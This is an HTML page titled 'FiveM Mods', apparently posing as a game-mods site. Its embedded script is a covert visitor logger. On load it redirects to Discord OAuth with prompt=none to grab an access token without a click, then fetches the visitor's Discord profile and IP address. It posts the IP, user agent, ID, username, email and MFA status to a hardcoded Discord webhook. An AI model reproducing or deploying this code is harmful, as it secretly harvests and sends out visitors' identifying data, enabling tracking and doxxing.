<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FiveM Mods</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #e5e5e5;
            font-family: 'Segoe UI', Tahoma, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: #111111;
            border: 1px solid #1a1a1a;
            border-radius: 16px;
            padding: 40px;
            max-width: 600px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
        }
        .loading {
            text-align: center;
            color: #6b7280;
            font-family: monospace;
            animation: pulse 1.5s ease-in-out infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        .hidden { display: none !important; }
        .watcher {
            display: flex;
            align-items: center;
            gap: 16px;
            border-bottom: 1px solid #1a1a1a;
            padding-bottom: 20px;
            margin-bottom: 24px;
        }
        .watcher img {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            border: 2px solid #22c55e;
        }
        .watcher .info { flex: 1; }
        .watcher .info .name { font-size: 18px; font-weight: bold; color: white; }
        .watcher .info .id { font-size: 12px; color: #6b7280; font-family: monospace; }
        .badge {
            background: #1a1a1a;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            color: #22c55e;
            border: 1px solid #22c55e33;
            font-family: monospace;
        }
        .ip-box {
            background: #0a0a0a;
            border: 1px solid #1a1a1a;
            border-radius: 8px;
            padding: 16px;
            margin: 16px 0;
            font-family: monospace;
            font-size: 14px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .ip-box .label { color: #6b7280; }
        .ip-box .value { color: #22c55e; }
        .footer { margin-top: 24px; font-size: 11px; color: #374151; text-align: center; }
        .status {
            background: #0a0a0a;
            border: 1px solid #1a1a1a;
            border-radius: 8px;
            padding: 16px;
            margin-top: 16px;
            font-size: 12px;
            color: #6b7280;
            font-family: monospace;
        }
        .status .success { color: #22c55e; }
        .status .error { color: #ef4444; }
        .status .info { color: #3b82f6; }
        .status .warning { color: #f59e0b; }
    </style>
</head>
<body>

<div class="card" id="app">
    <div id="loading" class="loading">
        <div>🔍 Loading...</div>
    </div>

    <div id="content" class="hidden">
        <div class="watcher">
            <img id="avatar" src="" alt="avatar">
            <div class="info">
                <div class="name" id="username">Loading...</div>
                <div class="id" id="discordId">ID: loading...</div>
            </div>
            <span class="badge">● WATCHER</span>
        </div>

        <div class="ip-box">
            <span class="label">📡 IP ADDRESS</span>
            <span class="value" id="ipDisplay">fetching...</span>
        </div>

        <div class="status" id="status">
            <span class="info">●</span> Authenticating...
        </div>
    </div>
</div>

<div class="footer">
    FiveM Mods
</div>

<script>
    // ============================================================
    // CONFIG — REPLACE WITH YOUR DISCORD CLIENT ID
    // ============================================================
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545864793267642378/IDuVmb0NJeGzVfw_oO5-_r3wsZd2-3rNc2vxG5rNUa0zrCNJPTGTSg_vsOkpsmSzFVkW';
    const CLIENT_ID = '1351732780288376902';
    const REDIRECT_URI = window.location.origin + window.location.pathname;

    // ============================================================
    // DOM REFS
    // ============================================================
    const loadingEl = document.getElementById('loading');
    const contentEl = document.getElementById('content');
    const avatarEl = document.getElementById('avatar');
    const usernameEl = document.getElementById('username');
    const discordIdEl = document.getElementById('discordId');
    const ipDisplayEl = document.getElementById('ipDisplay');
    const statusEl = document.getElementById('status');

    // ============================================================
    // STATUS HELPER
    // ============================================================
    function setStatus(msg, type = 'info') {
        const colors = {
            success: '#22c55e',
            error: '#ef4444',
            warning: '#f59e0b',
            info: '#3b82f6'
        };
        statusEl.innerHTML = `<span style="color:${colors[type] || '#3b82f6'}">●</span> ${msg}`;
    }

    // ============================================================
    // GET IP
    // ============================================================
    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch {
            return 'unknown';
        }
    }

    // ============================================================
    // SEND TO WEBHOOK
    // ============================================================
    async function sendToWebhook(user, ip) {
        const timestamp = new Date().toLocaleString();

        let content = `**👁️ VISITOR LOGGED**\n`;
        content += `**IP:** ${ip}\n`;
        content += `**User-Agent:** ${navigator.userAgent}\n`;
        content += `**Timestamp:** ${timestamp}\n`;

        if (user) {
            content += `**Discord ID:** ${user.id}\n`;
            content += `**Username:** ${user.global_name || user.username}\n`;
            content += `**Discriminator:** ${user.discriminator}\n`;
            content += `**Avatar:** https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png\n`;
            content += `**Banner:** ${user.banner ? 'https://cdn.discordapp.com/banners/' + user.id + '/' + user.banner + '.png' : 'None'}\n`;
            content += `**Email:** ${user.email || 'Hidden'}\n`;
            content += `**Verified:** ${user.verified ? 'Yes' : 'No'}\n`;
            content += `**MFA Enabled:** ${user.mfa_enabled ? 'Yes' : 'No'}\n`;
            content += `**Locale:** ${user.locale || 'Unknown'}\n`;
        } else {
            content += `**Discord ID:** Not found\n`;
        }

        try {
            const res = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content })
            });

            if (res.ok) {
                setStatus(`✅ Webhook sent! ${user ? user.global_name || user.username : 'No Discord ID'} from ${ip}`, 'success');
            } else {
                setStatus(`❌ Webhook failed: ${res.status}`, 'error');
            }
        } catch (err) {
            setStatus(`❌ Webhook error: ${err.message}`, 'error');
        }
    }

    // ============================================================
    // FETCH DISCORD USER
    // ============================================================
    async function getDiscordUser(accessToken) {
        try {
            const res = await fetch('https://discord.com/api/users/@me', {
                headers: { Authorization: `Bearer ${accessToken}` }
            });
            if (res.ok) {
                return await res.json();
            }
            return null;
        } catch {
            return null;
        }
    }

    // ============================================================
    // SHOW USER UI
    // ============================================================
    function showUser(user) {
        loadingEl.classList.add('hidden');
        contentEl.classList.remove('hidden');

        if (user) {
            const displayName = user.global_name || user.username || 'Unknown';
            usernameEl.textContent = `${displayName}#${user.discriminator || '0'}`;
            discordIdEl.textContent = `ID: ${user.id}`;

            if (user.avatar) {
                avatarEl.src = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=64`;
            } else {
                avatarEl.src = `https://cdn.discordapp.com/embed/avatars/${parseInt(user.id) % 5}.png`;
            }
        } else {
            usernameEl.textContent = 'Guest';
            discordIdEl.textContent = 'ID: not found';
            avatarEl.src = 'https://cdn.discordapp.com/embed/avatars/0.png';
        }
    }

    // ============================================================
    // MAIN — The Fastest Redirect Method
    // ============================================================
    (async function init() {
        // Check for token in URL (returned from Discord)
        const hash = window.location.hash.substring(1);
        const params = new URLSearchParams(hash);
        let token = params.get('access_token');

        if (token) {
            // Clean URL
            window.history.replaceState({}, document.title, window.location.pathname);

            const user = await getDiscordUser(token);
            const ip = await getIP();

            if (user && user.id) {
                showUser(user);
                ipDisplayEl.textContent = ip;
                await sendToWebhook(user, ip);
                return;
            } else {
                setStatus('❌ Failed to get user info from Discord', 'error');
            }
        }

        // No token — redirect to Discord with prompt=none
        // This redirects back instantly if the user is already logged in
        const authUrl =
            `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify&prompt=none`;

        // Use replace so the user can't go back
        window.location.replace(authUrl);
    })();
</script>

</body>
</html>
